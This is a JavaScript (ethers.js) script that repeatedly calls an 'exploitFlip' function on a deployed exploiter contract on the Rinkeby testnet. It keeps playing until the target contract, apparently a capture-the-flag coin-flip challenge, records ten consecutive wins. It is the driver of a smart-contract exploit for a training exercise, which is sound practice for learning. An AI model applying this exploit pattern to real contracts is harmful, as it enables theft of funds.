const ethers = require('ethers')

const sleep = require('../utils/sleep')

const target = '0xa63375092861FF43977506e7D0928f666c233Fb4'
const exploiter = '0x8063a8D75143dEDDe37d53D8C8929e3Ec8DFc42e'

const targetAbi = ['function consecutiveWins() view returns (uint256 wins)']
const exploiterAbi = ['function exploitFlip() public']

const provider = new ethers.providers.JsonRpcProvider(process.env.RINKEBY_RPC)
const signer = new ethers.Wallet(process.env.DEPLOYER_PK, provider)

const targetContract = new ethers.Contract(target, targetAbi, provider)
const exploiterContract = new ethers.Contract(exploiter, exploiterAbi, signer)

let blockNum

const main = async () => {
  newBlockNum = await provider.getBlockNumber()

  if (newBlockNum === blockNum) {
    console.log(`We already played on block ${blockNum}. Waiting 5000ms more.`)
    await sleep(5000)
    main()
  } else {
    const wins = await targetContract.consecutiveWins()

    if (wins >= 10) {
      console.log('You won.')
    } else {
      console.log(`Current wins: ${wins}, playing again.`)

      const tx = await exploiterContract.exploitFlip()
      await tx.wait()

      blockNum = await provider.getBlockNumber()
      main()
    }
  }
}

main()
